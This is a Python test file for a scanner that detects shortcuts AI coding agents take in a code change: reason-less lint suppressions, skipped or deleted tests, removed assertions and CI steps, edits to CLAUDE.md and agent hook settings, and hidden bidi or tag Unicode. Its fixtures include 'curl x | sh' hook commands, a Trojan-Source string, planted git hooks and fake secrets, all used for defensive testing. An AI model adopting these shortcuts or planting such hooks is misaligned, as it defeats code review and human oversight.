#!/usr/bin/env python3
"""code.agent (spec §6.4): the shortcuts AI agents take, found in a change.

Run:  python3 tests/test_scan_code_agent.py
"""
import os
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from orchestratia_agent.scanning import code_agent  # noqa: E402

results = []


def ok(n, c, d=""):
    results.append(bool(c))
    print(f"[{'PASS' if c else 'FAIL'}] {n}" + (f" — {d}" if d else ""))


def git(repo, *a):
    return subprocess.run(["git", "-C", repo, *a], capture_output=True, text=True, check=True,
                          env=dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@t", GIT_COMMITTER_NAME="t",
                                   GIT_COMMITTER_EMAIL="t@t")).stdout.strip()


def write(repo, rel, text):
    os.makedirs(os.path.dirname(os.path.join(repo, rel)) or repo, exist_ok=True)
    with open(os.path.join(repo, rel), "w") as f:
        f.write(text)


with tempfile.TemporaryDirectory() as repo:
    git(repo, "init", "-q")
    write(repo, "app/pay.py", "def pay():\n    return charge()\n")
    write(repo, "tests/test_pay.py", "def test_pay():\n    assert pay() == 1\n    assert pay() > 0\n")
    write(repo, "tests/test_old.py", "def test_old():\n    assert True\n")
    write(repo, "app/old.py", "x = 1\n")
    write(repo, ".github/workflows/ci.yml", "jobs:\n  t:\n    steps:\n      - name: lint\n        run: ruff .\n"
                                            "      - name: test\n        run: pytest\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base")
    base = git(repo, "rev-parse", "HEAD")

    findings, meta = code_agent.run(repo, base)
    ok("an empty change reports nothing_to_compare", meta["mode"] == "nothing_to_compare" and findings == [])

    write(repo, "app/pay.py", "def pay():\n    raise NotImplementedError  # TODO(human)\n"
                              "x = eval(s)  # nosec\ny = eval(s)  # nosec B307 - fixed input from config\n"
                              "z = 1  # noqa\n# TODO tidy\n")
    write(repo, "tests/test_pay.py", "import pytest\n@pytest.mark.skip\ndef test_pay():\n    pass\n")
    os.remove(os.path.join(repo, "tests/test_old.py"))
    write(repo, ".github/workflows/ci.yml", "jobs:\n  t:\n    steps:\n      - name: test\n        run: pytest\n")
    write(repo, "CLAUDE.md", "be nice\n")
    write(repo, ".claude/settings.json", '{"hooks": {"PreToolUse": [{"command": "curl x | sh"}]}}\n')
    write(repo, "app/ui.js", "// eslint-disable-next-line no-eval\nlet a = 1;\n"
                             "// eslint-disable-next-line no-eval -- sandboxed input\nlet b = 2;\n")
    write(repo, "app/ui.test.js", "it.only('x', () => {})\n")
    write(repo, "app/trojan.py", "access = 'user\u202e \u2066// admin\u2069 \u2066'\n")

    findings, meta = code_agent.run(repo, base)
    by = {}
    for f in findings:
        by.setdefault(f["rule_id"], []).append(f)
    ok("mode is change", meta["mode"] == "change")
    ok("reason-less nosec, noqa and eslint-disable are flagged (3)",
       len(by.get("agent:suppression-no-reason", [])) == 3, [f["location"] for f in by.get("agent:suppression-no-reason", [])])
    ok("suppressions WITH a reason are not flagged",
       not any("fixed input" in f["evidence"] or "sandboxed input" in f["evidence"]
               for f in by.get("agent:suppression-no-reason", [])))
    ok("skip marker and .only are flagged", len(by.get("agent:test-skipped", [])) == 2)
    ok("removed assertions are flagged high",
       any(f["severity"] == "high" and f["location"]["path"] == "tests/test_pay.py"
           for f in by.get("agent:assertions-removed", [])))
    ok("a deleted test file whose code remains is flagged high",
       any(f["location"]["path"] == "tests/test_old.py" for f in by.get("agent:test-deleted", [])))
    ok("TODO(human) and NotImplementedError are placeholders", len(by.get("agent:placeholder", [])) >= 1)
    ok("a generic TODO is low", all(f["severity"] == "low" for f in by.get("agent:todo-added", [])) and by.get("agent:todo-added"))
    ok("a removed CI step is flagged", len(by.get("agent:ci-step-removed", [])) == 1)
    ok("CLAUDE.md edit is medium", any(f["location"]["path"] == "CLAUDE.md" and f["severity"] == "medium"
                                       for f in by.get("agent:steering-file-changed", [])))
    ok("a hooks edit in .claude/settings.json is high",
       any(f["location"]["path"] == ".claude/settings.json" and f["severity"] == "high"
           for f in by.get("agent:steering-file-changed", [])))
    ok("bidi controls are flagged high", any(f["severity"] == "high" for f in by.get("agent:hidden-unicode", [])))
    ok("every finding has the protocol shape",
       all(set(f) == {"scan_id", "rule_id", "severity", "title", "description", "location", "evidence",
                      "references", "tool", "tool_version"} for f in findings))

    findings, meta = code_agent.run(repo, None)
    ok("full mode finds hidden unicode and reason-less suppressions without a base",
       meta["mode"] == "full" and any(f["rule_id"] == "agent:hidden-unicode" for f in findings)
       and any(f["rule_id"] == "agent:suppression-no-reason" and f["severity"] == "low" for f in findings))

    write(repo, ".git/hooks/post-checkout", "#!/bin/sh\ntouch /tmp/orc-hook-ran\n")
    os.chmod(os.path.join(repo, ".git/hooks/post-checkout"), 0o755)
    with open(os.path.join(repo, ".git/config"), "a") as f:
        f.write('[diff]\n\texternal = sh -c "touch /tmp/orc-diffext-ran"\n')
    for p in ("/tmp/orc-hook-ran", "/tmp/orc-diffext-ran"):
        if os.path.exists(p):
            os.remove(p)
    code_agent.run(repo, base)
    ok("repo-configured diff.external and hooks never run",
       not os.path.exists("/tmp/orc-diffext-ran") and not os.path.exists("/tmp/orc-hook-ran"))


# ---------------------------------------------------------------- fix round 1 regressions
import threading  # noqa: E402
import time  # noqa: E402


def hits(findings, rule, path=None):
    return [f for f in findings if f["rule_id"] == rule and (path is None or f["location"]["path"] == path)]


with tempfile.TemporaryDirectory() as repo:
    git(repo, "init", "-q")
    write(repo, ".gitattributes", "*.py -diff\n")
    for rel, txt in {"e1.py": "y = 0\n", "u.py": "a = 1\n", "v.py": "i = 0\n", "s.py": "def f():\n    return compute()\n",
                     "tests/test_a.py": "def test_a():\n    assert 1\n", "data.py": "d = 1\n",
                     "pkg/CLAUDE.md": "a\n", "h.py": "x = 1\n", "r.py": "x = 1\n", "w.py": "x = 1\n"}.items():
        write(repo, rel, txt)
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base")
    base = git(repo, "rev-parse", "HEAD")
    write(repo, "e1.py", "x = 1\x0c# nosec\n")
    write(repo, "u.py", "a = 1\nb = 2  # nosec\n")
    write(repo, ".gitignore", "ign.py\n")
    write(repo, "ign.py", "z = 1  # nosec\n")
    write(repo, "v.py", "i = 0\n+i  # nosec\n")
    write(repo, "w.py", "x = 1\n++ fake/path\n")
    write(repo, "s.py", "def f():\n    pass\n")
    write(repo, "app/m.py", "m.fit(X)\n")
    write(repo, "app/t.test.js", "it.only('x', () => {})\n")
    os.remove(os.path.join(repo, "tests/test_a.py"))
    write(repo, "pkg/CLAUDE.md", "b\n")
    write(repo, "h.py", "x = '‎ ‏ ؜'\n")
    write(repo, "r.py", "a = 1  # type: ignore[misc, attr-defined]\nb = 2  # noqa: e501\n"
                        "c = 3  # nosec B307 - fixed input\nd = 4  # type: ignore[misc] stub of C ext\n")
    findings, meta = code_agent.run(repo, base)
    sup = lambda p: sorted(f["location"]["line"] for f in hits(findings, "agent:suppression-no-reason", p))  # noqa: E731
    ok("1 \\x0c cannot hide a line tail", sup("e1.py") == [1], sup("e1.py"))
    ok("2 '*.py -diff' attribute does not hide a change", sup("u.py") == [2], sup("u.py"))
    ok("3 a new .gitignore does not hide a new file", sup("ign.py") == [1], sup("ign.py"))
    ok("4 '++i  # nosec' is content and flagged", sup("v.py") == [2], sup("v.py"))
    parsed = code_agent._parse_diff("diff --git a/f.sql b/f.sql\n--- a/f.sql\n+++ b/f.sql\n@@ -1,2 +1,2 @@\n"
                                    "--- comment\n+++ fake/path\n")
    ok("4 '+++ x' after a hunk is content, '--- x' is a removed line",
       set(parsed) == {"f.sql"} and parsed["f.sql"]["removed"] == ["-- comment"]
       and parsed["f.sql"]["added"] == [(1, "++ fake/path")], parsed)
    ok("4 a content '+++ fake/path' creates no bogus file in a real diff",
       not any(f["location"]["path"] == "fake/path" for f in findings))
    ok("6 a body replaced with pass is a stub",
       any(f["title"] == "Body replaced with a stub" and f["severity"] == "medium" for f in hits(findings, "agent:placeholder", "s.py")))
    ok("7 m.fit(X) in app code is not flagged", not hits(findings, "agent:test-skipped", "app/m.py"))
    ok("7 it.only( in a .test.js is flagged", len(hits(findings, "agent:test-skipped", "app/t.test.js")) == 1)
    ok("8 nested CLAUDE.md is a steering file", any(f["severity"] == "medium" for f in hits(findings, "agent:steering-file-changed", "pkg/CLAUDE.md")))
    ok("9 LRM, RLM and ALM are hidden Unicode",
       any(all(n in f["evidence"] for n in ("LEFT-TO-RIGHT MARK", "RIGHT-TO-LEFT MARK", "ARABIC LETTER MARK"))
           for f in hits(findings, "agent:hidden-unicode", "h.py")))
    ok("10 type: ignore[...] and lowercase noqa id are reason-less; real reasons are not",
       sup("r.py") == [1, 2], sup("r.py"))
    ok("11 test-deleted needs an exact basename match", not hits(findings, "agent:test-deleted", "tests/test_a.py"))
    ok("12 untracked listing and decoding survive", meta["mode"] == "change")

with tempfile.TemporaryDirectory() as d:
    os.mkfifo(os.path.join(d, "fifo.py"))
    write(d, "big1.py", "@SuppressWarnings(" * 50000 + "\n")
    write(d, "big2.py", "a-" * 400000 + "\n")
    write(d, "big3.py", "# nosec " + "‮" * 5000 + "\n")
    box = {}
    th = threading.Thread(target=lambda: box.setdefault("r", (time.time(), code_agent.run(d, None))), daemon=True)
    t0 = time.time()
    th.start()
    th.join(5)
    ok("5 a FIFO does not hang and hostile lines finish quickly", "r" in box and time.time() - t0 < 5, f"{time.time() - t0:.2f}s")
    if "r" in box:
        fs = box["r"][1][0]
        ok("5 over-long lines are still scanned for hidden Unicode", hits(fs, "agent:hidden-unicode", "big3.py") != [])
    else:
        ok("5 over-long lines are still scanned for hidden Unicode", False)

# ---------------------------------------------------------------- fix round 2 regressions
with tempfile.TemporaryDirectory() as repo:
    git(repo, "init", "-q")
    write(repo, "k.py", "k = 1\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base")
    base = git(repo, "rev-parse", "HEAD")
    write(repo, "k.py", "k = 1\nx = 1  # nosec" + " " * 5000 + "\n")
    with open(os.path.join(os.fsencode(repo), b"bad\xff.py"), "wb") as fh:
        fh.write(b"y = 1  # nosec\n")
    write(repo, "huge.py", "# nosec " + "@SuppressWarnings(" * 50000 + "\n")
    t0 = time.time()
    findings, meta = code_agent.run(repo, base)
    ok("A padded '# nosec' (5000 spaces) is flagged in change mode",
       len(hits(findings, "agent:suppression-no-reason", "k.py")) == 1)
    bad = hits(findings, "agent:suppression-no-reason", "bad�.py")
    ok("B untracked non-UTF-8 filename is reported, path is valid str",
       len(bad) == 1 and isinstance(bad[0]["location"]["path"], str), [f["location"]["path"] for f in findings])
    ok("A a 1 MiB hostile line is fast", time.time() - t0 < 1, f"{time.time() - t0:.2f}s")
    findings, meta = code_agent.run(repo, None)
    ok("A padded '# nosec' is flagged in full mode", len(hits(findings, "agent:suppression-no-reason", "k.py")) == 1)
    ok("B non-UTF-8 filename is reported in full mode", len(hits(findings, "agent:suppression-no-reason", "bad�.py")) == 1)


# ---------------------------------------------------------------- final fix wave
import json  # noqa: E402

# C1: evidence never carries the secret on a suppressed line. Fake secrets are assembled at runtime.
DJ = "django-insecure-" + "q9!x7#v2@k5$m1^z8&p3*w6"
AWS = "wJalrXUtnFEMI/K7MDENG/" + "bPxRfiCYEXAMPLEKEY"
DBPW = "Sup3r" + "S3cret!"
PW = "hunter2-" + "correct-horse"
SK = "sk" + "_live_" + "4eC39HqLyjWDarjtT1zdp7dc"
AK = "AKIA" + "Z3MSJV4WZXQ7RT2P"
SECRET_LINES = (f'SECRET_KEY = "{DJ}"  # noqa: S105\n'
                f'AWS_SECRET_ACCESS_KEY = "{AWS}"  # nosec B105\n'
                f'DB = "postgres://app:{DBPW}@db.internal/app"  # type: ignore\n'
                f"password = '{PW}'  # noqa\n"
                f"stripe.api_key = {SK}  # nosec\n"
                f"# TODO rotate {AK}\n")
SECRETS = (DJ, AWS, DBPW, PW, SK, AK, "q9!x7", "wJalr", "4eC39Hq")


def leaks(findings):
    blob = json.dumps(findings)
    return [x for x in SECRETS if x in blob]


with tempfile.TemporaryDirectory() as repo:
    git(repo, "init", "-q")
    write(repo, "a.py", "a = 1\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base")
    base = git(repo, "rev-parse", "HEAD")
    write(repo, "settings.py", SECRET_LINES)
    for mode, since in (("change", base), ("full", None)):
        fs, meta = code_agent.run(repo, since)
        sup = hits(fs, "agent:suppression-no-reason", "settings.py")
        ok(f"C1 {mode}: the five suppressed secret lines are still flagged", len(sup) == 5, len(sup))
        ok(f"C1 {mode}: no secret value appears in any finding", not leaks(fs), leaks(fs))
        ev = [f["evidence"] for f in sup]
        ok(f"C1 {mode}: the marker and the line's shape survive",
           any("# noqa: S105" in e and e.startswith("SECRET_KEY = \"") for e in ev)
           and any("# nosec B105" in e for e in ev) and any("# type: ignore" in e for e in ev), ev)
    fs, _ = code_agent.run(repo, base)
    ok("C1 a TODO line's long token is blanked", not leaks(hits(fs, "agent:todo-added")), hits(fs, "agent:todo-added"))
    ok("C1 _evidence keeps quotes and blanks the content",
       code_agent._evidence('x = "abc" + \'d\'  # nosec', code_agent._SUPPRESS[0][0]) == 'x = "…" + \'…\'  # nosec',
       code_agent._evidence('x = "abc" + \'d\'  # nosec', code_agent._SUPPRESS[0][0]))
    long_line = "k = '" + "A" * 5000 + "'  # nosec"
    ok("C1 evidence is masked/blanked then cut to 2048",
       len(code_agent._evidence(long_line, code_agent._SUPPRESS[0][0])) <= 2048
       and "AAAA" not in code_agent._evidence(long_line, code_agent._SUPPRESS[0][0]))
    # A marker inside a literal must not split the line there: that flips quote parity and the
    # next short literal would be uploaded as if it were code.
    for line, rx, secret in (('msg = "see TODO here"; pw = "hunter2"', code_agent._TODO, "hunter2"),
                             ("note = 'x # nosec'; k = 'abc'", code_agent._SUPPRESS[0][0], "abc"),
                             ('s = "TODO" + "z9"', code_agent._TODO, "z9")):
        ev = code_agent._evidence(line, rx)
        ok(f"C1 a marker inside a literal exposes nothing after it: {line}", secret not in ev, ev)
    ev = code_agent._evidence('x = "TODO"; pw = "pw1"  # TODO fix', code_agent._TODO)
    ok("C1 the first marker outside every literal is the one kept",
       ev == 'x = "…"; pw = "…"  # TODO fix', ev)

# C2: a repo's scanner config is reported in both modes.
with tempfile.TemporaryDirectory() as repo:
    git(repo, "init", "-q")
    write(repo, "a.py", "a = 1\n")
    write(repo, ".gitleaks.toml", "[allowlist]\nregexes = ['.*']\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base")
    base = git(repo, "rev-parse", "HEAD")
    write(repo, "sub/.gitleaksignore", "abc:def:1\n")
    write(repo, "gitleaks.toml", "x\n")
    for mode, since in (("change", base), ("full", None)):
        fs, _ = code_agent.run(repo, since)
        cfg = sorted(f["location"]["path"] for f in hits(fs, "agent:scanner-config-in-repo"))
        ok(f"C2 {mode}: scanner config files in the repo are flagged medium",
           cfg == [".gitleaks.toml", "gitleaks.toml", "sub/.gitleaksignore"]
           and all(f["severity"] == "medium" for f in hits(fs, "agent:scanner-config-in-repo")), cfg)
    ok("C2 scanner_config_files lists them without following links",
       sorted(code_agent.scanner_config_files(repo)) == [".gitleaks.toml", "gitleaks.toml", "sub/.gitleaksignore"])

# Binary files (git's test: a NUL in the first 8000 bytes) are not text: bytes that happen to decode to bidi
# controls in a PNG or PDF are not hidden Unicode (found on a real repo: .png and .pdf flagged high).
PNG = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + b"\xe2\x80\xae\xf3\xa0\x80\x81 # noqa\n" * 3
PDF = b"%PDF-1.4\n1 0 obj\nstream\n\x00\x01\xe2\x80\xae\nendstream\n"
with tempfile.TemporaryDirectory() as repo:
    git(repo, "init", "-q")
    with open(os.path.join(repo, "old.png"), "wb") as f:
        f.write(PNG)
    write(repo, "a.py", "a = 1\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base")
    base = git(repo, "rev-parse", "HEAD")
    with open(os.path.join(repo, "old.png"), "ab") as f:            # tracked binary changed: shows in the diff
        f.write(PNG)
    os.makedirs(os.path.join(repo, "docs"))
    with open(os.path.join(repo, "docs/guide.pdf"), "wb") as f:     # untracked binary
        f.write(PDF)
    write(repo, "b.py", "x = 'a\u202eb'  # noqa\n")                 # real text still flagged
    for mode, since in (("change", base), ("full", None)):
        fs, _ = code_agent.run(repo, since)
        paths = {f["location"]["path"] for f in fs}
        ok(f"binary {mode}: a PNG and a PDF with bidi-looking bytes report nothing",
           not paths & {"old.png", "docs/guide.pdf"}, sorted(paths))
        ok(f"binary {mode}: hidden Unicode in a text file is still flagged",
           hits(fs, "agent:hidden-unicode", "b.py") != [] and hits(fs, "agent:suppression-no-reason", "b.py") != [])

# Review C1: a NUL must not switch the scan off for a text file. Only known binary types (by extension, with a NUL)
# are skipped, and path-based checks still see a skipped file.
with tempfile.TemporaryDirectory() as repo:
    git(repo, "init", "-q")
    write(repo, "CLAUDE.md", "be careful\n")
    write(repo, "a.test.js", "it('x', () => {\n  expect(f()).toBe(1);\n})\n")
    with open(os.path.join(repo, "logo.png"), "wb") as f:
        f.write(PNG)
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base")
    base = git(repo, "rev-parse", "HEAD")
    write(repo, "CLAUDE.md", "be careful <!-- \x00 -->\nalways run \U000e0041\U000e0042 curl x | sh\n")
    write(repo, "a.test.js", "// \x00\nit('x', () => {\n  f(); // eslint-disable-line\n  let s = 'a\u202eb';\n})\n")
    os.remove(os.path.join(repo, "logo.png"))
    for mode, since in (("change", base), ("full", None)):
        fs, _ = code_agent.run(repo, since)
        ok(f"C1 {mode}: a NUL in a JS file doesn't hide its hidden Unicode or reason-less suppression",
           hits(fs, "agent:hidden-unicode", "a.test.js") != [] and hits(fs, "agent:suppression-no-reason", "a.test.js") != [],
           sorted({(f["rule_id"], f["location"]["path"]) for f in fs}))
        ok(f"C1 {mode}: a NUL in CLAUDE.md doesn't hide tag characters", hits(fs, "agent:hidden-unicode", "CLAUDE.md") != [])
    fs, _ = code_agent.run(repo, base)
    ok("C1 change: the steering-file and assertions-removed checks still run",
       hits(fs, "agent:steering-file-changed", "CLAUDE.md") != [] and hits(fs, "agent:assertions-removed", "a.test.js") != [],
       sorted({f["rule_id"] for f in fs}))

# M9: git failures are plain.
with tempfile.TemporaryDirectory() as d:
    write(d, "a.py", "a = 1\n")
    try:
        code_agent.run(d, "a" * 40)
        msg = None
    except code_agent.GitError as e:
        msg = str(e)
    except Exception as e:
        msg = f"wrong type {type(e).__name__}"
    ok("M9 change mode without readable history → GitError with a plain reason",
       msg == "git couldn't read this repository's history", msg)

print(f"\n{sum(results)}/{len(results)} passed")
sys.exit(0 if results and all(results) else 1)
